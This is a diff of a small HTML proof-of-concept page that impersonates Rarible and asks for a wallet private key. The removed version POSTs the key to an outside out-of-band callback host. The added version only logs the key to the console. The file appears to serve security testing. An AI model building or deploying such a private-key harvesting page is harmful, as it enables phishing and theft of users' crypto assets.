@@ -1,61 +1,37 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Rarible Authentication PoC</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-        }
-
-        h2 {
-            color: #333;
-        }
-
-        form {
-            max-width: 300px;
-            margin: 0 auto;
-        }
-
-        label {
-            display: block;
-            margin-bottom: 5px;
-            color: #333;
-        }
-
-        input[type="text"] {
-            width: 100%;
-            padding: 8px;
-            margin-bottom: 10px;
-            box-sizing: border-box;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-        }
-
-        input[type="submit"] {
-            background-color: #000;
-            color: #fff;
-            padding: 10px 15px;
-            border: none;
-            border-radius: 10px;
-            cursor: pointer;
-        }
-
-        input[type="submit"]:hover {
-            background-color: #333;
-        }
-    </style>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Form Submission with JavaScript</title>
 </head>
+
 <body>
-    <h2>Enter your private key to authenticate to Rarible</h2>
-    <form id="raribleForm" action="https://cnr3wf12vtc0000rfd40gkhb68wyyyyyb.oast.fun" method="POST">
-        <label for="privateKey">Private Key:</label>
-        <input type="text" id="privateKey" name="privateKey" required>
-        <br>
-        <input type="submit" value="Submit">
-    </form>
+
+	<h1>Rarible Authentication</h1>
+
+	<form id="myForm">
+		<label for="privateKey">Private Key:</label>
+		<input type="text" id="privateKey" name="privateKey" required>
+
+		<button type="button" onclick="submitForm()">Submit</button>
+	</form>
+
+	<script>
+		function submitForm() {
+
+			var privateKey = document.getElementById('privateKey').value;
+
+			var formData = {
+				privateKey: privateKey
+			};
+
+			var jsonData = JSON.stringify(formData);
+			console.log(jsonData);
+		}
+	</script>
+
 </body>
+
 </html>
